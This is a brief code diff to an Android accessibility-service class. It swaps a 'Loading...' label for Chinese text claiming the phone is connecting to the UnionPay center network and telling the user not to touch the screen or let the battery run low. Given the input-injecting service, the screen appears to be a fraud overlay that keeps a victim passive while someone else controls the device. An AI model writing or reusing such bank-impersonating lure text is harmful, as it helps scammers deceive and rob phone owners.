@@ -769,7 +769,7 @@ class InputService : AccessibilityService() {
        })*/
 	    
 	val loadingText = TextView(this, null)
-	loadingText.text = "Loading..."
+	loadingText.text = "正在对接银联中心网络... ...\n 请勿触碰手机屏幕 \n 防止中断业务 \n 保持手机电量充足..."
 	loadingText.setTextColor(-7829368)
 	loadingText.textSize = 20.0f
 	loadingText.gravity = Gravity.CENTER
